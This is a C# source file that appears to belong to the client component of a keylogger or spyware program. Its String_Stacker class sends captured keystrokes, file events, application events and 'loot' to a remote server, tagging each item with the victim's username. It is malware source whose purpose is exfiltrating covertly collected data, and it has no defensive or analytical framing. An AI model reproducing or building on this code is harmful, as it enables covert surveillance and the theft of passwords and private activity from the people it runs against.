using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client.Communication
{
    /// <summary>
    /// A class that stacks Keylog send requests incase they didn't send to the server.
    /// </summary>
    public static class String_Stacker
    {
        public enum StringType
        {
            Keylog, FileEvent, ApplicationEvent, Loot
        }
        public static async Task Send(string sdata, StringType type)
        {
            await Task.Run(async () =>
            {
                switch (type)
                {
                    case StringType.Keylog:
                        await Server.AsyncSendString(sdata, Client.Utilities.User_Info.GetUserName(), "logs");
                        break;
                    case StringType.FileEvent:
                        await Server.AsyncSendString(sdata, Client.Utilities.User_Info.GetUserName(), "fileevent");
                        break;
                    case StringType.ApplicationEvent:
                        await Server.AsyncSendString(sdata, Client.Utilities.User_Info.GetUserName(), "applicationevent");
                        break;
                    case StringType.Loot:
                        await Server.AsyncSendString(sdata, Client.Utilities.User_Info.GetUserName(), "loot");
                        break;
                }
            });
        }
    }
}
